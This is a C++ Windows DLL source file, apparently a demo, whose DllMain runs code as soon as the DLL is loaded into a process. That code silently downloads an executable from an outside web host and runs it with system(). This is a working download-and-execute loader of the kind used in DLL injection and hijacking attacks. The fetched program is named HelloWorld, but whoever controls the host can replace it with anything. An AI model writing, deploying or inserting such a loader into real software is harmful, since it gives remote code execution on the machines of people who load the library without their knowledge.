// dllmain.cpp : 定義 DLL 應用程式的進入點。
#include "pch.h"
#include <Windows.h>
#include <Urlmon.h>

#pragma comment(lib, "Urlmon.lib")
BOOL APIENTRY DllMain(HMODULE hModule,
	DWORD  ul_reason_for_call,
	LPVOID lpReserved
)
{
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
	{
		HRESULT ret = URLDownloadToFileW(
			nullptr,
			L"https://ams.dinlon5566.com/Download/helloworld/HelloWorld_x64.exe",
			L"HelloWorld_x64.exe",
			0,
			nullptr
		);
		if (ret != S_OK) {
			return -1;
		}
		system("HelloWorld_x64.exe");
	}
	break;
	case DLL_THREAD_ATTACH:
		break;
	case DLL_THREAD_DETACH:
		break;
	case DLL_PROCESS_DETACH:
		break;
	}
	return TRUE;
}

